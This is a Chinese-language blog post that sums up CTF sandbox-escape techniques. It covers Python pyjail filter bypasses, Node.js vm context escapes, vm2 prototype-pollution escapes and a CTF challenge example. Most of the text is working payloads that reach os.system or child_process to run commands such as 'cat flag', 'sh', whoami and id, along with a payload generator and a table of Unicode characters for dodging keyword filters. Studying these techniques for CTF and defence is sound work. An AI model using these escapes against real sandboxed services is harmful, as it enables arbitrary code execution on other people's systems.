---
title: "CTF沙箱逃逸经验总结——从Python pyjail到Node.js VM2"
slug: "ctf-sandbox-escape-guide"
date: "2026-07-21"
excerpt: "全面总结CTF沙箱逃逸类题目的核心考点和实战经验，涵盖Python pyjail、Node.js vm、vm2沙箱逃逸"
---

## CTF沙箱逃逸经验总结——从Python pyjail到Node.js VM2

### 一、沙箱逃逸概述

沙箱逃逸（Sandbox Escape）是 CTF Misc/Pwn/Web 中常见的题目类型，题目提供一个受限的执行环境（沙箱），选手需绕过过滤限制，执行系统命令读取 flag。

**常见题型：**
1. **Python 沙箱（pyjail）**：过滤危险函数、关键字、模块，要求构造 payload 读取 flag
2. **Node.js vm 沙箱**：利用 `vm` 模块的上下文逃逸
3. **vm2 沙箱**：利用原型链污染或内部属性逃逸
4. 其他语言沙箱（PHP disable_functions、JavaScript 沙箱等）

**核心思路：** 沙箱本质是"限制代码能访问什么"，逃逸就是寻找从受限上下文访问到外部（`process`、`os`、全局对象）的路径。

---

### 二、Python 沙箱逃逸（pyjail）

#### 2.1 概述与原理

pyjail 通常在 `eval()` / `exec()` 中执行用户输入，并过滤危险关键字（`import`、`os`、`system`、`open` 等）。逃逸的核心是利用 Python 对象的属性链（`__class__`、`__mro__`、`__subclasses__`、`__globals__` 等）间接访问被过滤的内容。

**关键属性链：**
```
().__class__.__bases__[0].__subclasses__()   # 获取所有子类
[].__class__.__mro__[-1]                     # 获取 object 基类
().__class__.__mro__[-1].__subclasses__()    # object 的所有子类
```

#### 2.2 基础绕过方法

```python
# 1. 直接导入 os 执行
__import__("os").system('cat flag')

# 2. 直接读文件
open("flag").read()

# 3. 用 chr 拼接绕过关键字过滤
open(chr(102)+chr(108)+chr(97)+chr(103)).read()

# 4. 用 eval(input()) 绕过字数限制（先输入 eval(input())，再输入真正的 payload）
print(open(chr(102)+chr(108)+chr(97)+chr(103)).read())

# 5. 使用 Unicode 字符绕过关键字过滤
ᵉval(inpᵘt())

# 6. 使用 breakpoint() 下断点进入 Pdb，再输入命令
breakpoint()

# 7. 利用 help() 交互式环境
# 输入 help()，再输入 sys，然后输入 !cat flag 获取 flag
# 在 help() 中输入 __main__ 或 __dict__ 查看信息泄露
```

#### 2.3 过滤绕过技巧

```python
# 8. 用 bytes([]).decode() 绕过 chr 的 decode
open((bytes([102])+bytes([108])+bytes([97])+bytes([103])).decode()).read()

# 9. 从 object 子类获取 os.system（经典 payload）
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__['system']('cat flag')

# 10. bytes 被过滤时用 type(str(1).encode()) 构造 bytes
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[
    (type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()
]((type(str(1).encode())([108])+type(str(1).encode())([115])).decode())
# 等价于 system('ls')
```

**一些方法的 type 构造：**
```python
str = type(str(0))
list = type(type(flag).mro())(flag)
bytes = type(flag.encode())
bool = type(flag.istitle())
int = type(flag.find(flag))
tuple = type(flag.partition(flag))
```

```python
# 11. + 被过滤时用 .__add__(xxx) 绕过
"a".__add__("b")

# 12. type 被过滤时用 list(dict(system=1))[0] 获取 "system" 字符串
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[list(dict(system=1))[0]](list(dict(sh=1))[0])
# 等价于 system('sh')

# 13. dir() 查看类中的方法和变量名
dir(my_flag)          # 如果有 encode 方法就可以读 flag
my_flag.flag_level5.encode()

# 14. globals()/vars() 查看全局变量信息泄露
globals()
vars()

# 15. 利用 __import__ 动态导入并读取
__import__("sys").__stdout__.write(__import__("os").read(__import__("os").open("flag",__import__("os").O_RDONLY), 0x114).decode())

# 16. 利用 lambda 匿名函数
(lambda: os.system('cat flag'))()
```

#### 2.4 自动生成 Payload

当 `+` 被过滤时，可使用 `.__add__()` 拼接，下面是自动生成 payload 的脚本：

```python
command = "cat flag_y0u_CaNt_FiNd_mE"
mylist = []
system = "[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]"
print(system, end='')
for i in command:
    mylist.append(f"type(str(1).encode())([{ord(i)}])")
print("(" + mylist.pop(0), end='')
for item in mylist:
    print(f".__add__({item})", end='')
print(")", end='')
```

#### 2.5 常用 Unicode 碰撞字符

用于绕过关键字过滤（NFKC 归一化后等价于普通字母）：

```python
from unicodedata import normalize
from string import ascii_lowercase
from collections import defaultdict
lst = list(ascii_lowercase)
dic = defaultdict(list)
for char in lst:
    for i in range(0x110000):
        if normalize("NFKC", chr(i)) == char:
            dic[char].append(chr(i))
        if len(dic[char]) > 9:
            break
for key, value in dic.items():
    print(key, value)
```

部分结果：
```
a ['a', 'ª', 'ᵃ', 'ₐ', 'ⓐ', 'ａ', '𝐚', '𝑎', '𝒂', '𝒶']
e ['e', 'ᵉ', 'ₑ', 'ℯ', 'ⅇ', 'ⓔ', 'ｅ', '𝐞', '𝑒', '𝒆']
i ['i', 'ᵢ', 'ⁱ', 'ℹ', 'ⅈ', 'ⅰ', 'ⓘ', 'ｉ', '𝐢', '𝑖']
o ['o', 'º', 'ᵒ', 'ₒ', 'ℴ', 'ⓞ', 'ｏ', '𝐨', '𝑜', '𝒐']
s ['s', 'ſ', 'ˢ', 'ₛ', 'ⓢ', 'ｓ', '𝐬', '𝑠', '𝒔', '𝓈']
```

### 三、Node.js vm 沙箱逃逸

#### 3.1 vm 模块简介

Node.js 的 `vm` 模块提供在独立上下文中执行代码的能力，但 **vm 并非安全沙箱**，官方明确声明其不能用于隔离不可信代码。

```javascript
const vm = require('vm');
sandbox = {
    'name': 'someone',
    'age': 18
}
context = vm.createContext(sandbox);
// 在当前 global 下创建作用域并运行代码，可访问 global 上的全局变量
const result = vm.runInThisContext("process.mainModule.require('child_process').exec('calc')", context);
console.log(result)
```

执行命令需要 `child_process` 模块，沙箱中不能直接 `require`，但可通过 `process` 对象获取。

#### 3.2 逃逸原理与防护

```javascript
const vm = require('vm');
// this 指向 vm 创建的 context，通过原型链拿到 Function，再拿到 process
const y1 = vm.runInNewContext(`this.toString.constructor("return process")();`);
console.log(y1.mainModule.require('child_process').exec('calc'));
```

**防护手段（将上下文对象原型链置为 null）：**
```javascript
const vm = require('vm');
context = Object.create(null);
const result = vm.runInNewContext(`this.constructor.constructor("return process")()`, context);
// 原型对象设置为 null，this 无法通过二次 constructor 获取 Function 原型对象
```

#### 3.3 绕过防护

**前置知识：**
```javascript
// arguments 是 object 对象，储存每个调用函数中的相关参数
// arguments.callee 是正在被执行的 Function 对象
// arguments.callee.caller 调用当前函数的外层函数
```

**绕过代码 1 —— 使用 arguments.callee.caller：**
```javascript
const vm = require('vm');
const res = vm.runInContext(`
    function test(){
        const a = {}
        a.toString = function () {
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').execSync('calc').toString()
        }
        return a
    }
	test();`,
    vm.createContext(Object.create(null)));
// 强制将 res 转为字符串触发 toString，从而绕过沙箱实现 RCE
console.log("" + res)
```

**绕过代码 2 —— 使用 Proxy 代理：**
```javascript
const vm = require('vm');
// value 是 {} 对象，在外部作用域下
const code3 = `new Proxy({}, {
    set: function(me, key, value) {
        (value.constructor.constructor('return process'))().mainModule.require('child_process').execSync('calc').toString()
    }
})`;
data = vm.runInContext(code3, vm.createContext(Object.create(null)));
data['some_key'] = {};  // 触发 Proxy 的 set 拦截器
```

---

### 四、VM2 沙箱逃逸

#### 4.1 vm2 简介

vm2 基于官方 `vm` 库构建沙箱，使用 JavaScript 的 Proxy 技术防止沙箱脚本逃逸。核心文件：

| 文件 | 作用 |
|------|------|
| cli.js | vm2 命令行调用 |
| contextify.js | 封装 Contextify/Decontextify，代理 global 的 Buffer |
| main.js | 入口，导出 NodeVM、VM、VMScript |
| sandbox.js | hook global 的函数和变量（setTimeout 等） |

```javascript
const {VM, VMScript} = require("vm2");
console.log(new VM().run(new VMScript("let a = 2;a")));
```

#### 4.2 逃逸示例

**示例 1 —— 原型链污染 + `in` 运算符触发 has：**
```javascript
"use strict";
var process;
Object.prototype.has = function (t, k) {
    process = t.constructor("return process")();
};
"" in Buffer.from;  // 触发 has 方法
process.mainModule.require("child_process").execSync("whoami").toString()
```

**JavaScript 属性基础：**
- **数据属性**：包含可读写值，`Writable` 控制是否可改
- **访问器属性**：包含 getter/setter 函数
- **内部属性**：引擎内部使用（如 `Prototype`，通过 `__proto__` 访问）
- 数据属性与访问器属性都有 `[[Enumerable]]` 和 `[[Configurable]]` 特性

**示例 2 —— 定义属性 + 异常抛出：**
```javascript
"use strict";
const {VM} = require('vm2');
const untrusted = `var process;
try{
    Object.defineProperty(Buffer.from(""), "", {get set(){
        Object.defineProperty(Object.prototype,"get",{get(){
            throw x=>x.constructor("return process")();
        }});
        return ()=>{};
    }});
}catch(e){
    process = e(()=>{});
}
process.mainModule.require("child_process").execSync("id").toString();`;
try{
    console.log(new VM().run(untrusted));
}catch(x){
    console.log(x);
}
```

#### 4.3 示例题目

**2023 HZNUCTF eznode**

存在 Node.js 原型链污染 + vm2 沙箱逃逸。关键代码：

```javascript
const backdoor = function () {
    try {
        new VM().run({}.shellcode);  // 原型链污染空对象的 shellcode 实现 RCE
    } catch (e) {
        console.log(e);
    }
}
app.post('/', function (req, res) {
    try {
        var body = JSON.parse(JSON.stringify(req.body));
        var copybody = clone(body)
        if (copybody.shit) {  // shit 属性为 True 时调用 backdoor()
            backdoor()
        }
        res.send("post shit ok")
    }catch(e){
        res.send("is it shit ?")
    }
})
```

**逃逸要点：**
- `let res = import('./app.js');` 返回 Promise 对象
- 任何对象的 `toString` 方法都从 Function 对象继承而来
- `Function` 的 `constructor` 属性引用 Function 构造函数本身
- `res.toString.constructor("return this")()` 返回全局上下文 `global`，进一步访问 `process`

---

### 五、工具与参考链接

| 工具/资源 | 用途 |
|-----------|------|
| [Lunatic《Misc-沙箱逃逸》](https://goodlunatic.github.io/posts/442fd1d/) | 本文主要来源 |
| [Python 沙箱逃逸总结](https://www.memsky.cn/) | pyjail 技巧汇总 |
| [Node.js vm 官方文档](https://nodejs.org/api/vm.html) | vm 模块说明 |
| [vm2 项目](https://github.com/patriksimek/vm2) | vm2 沙箱源码 |
| CyberChef | 编码绕过辅助 |

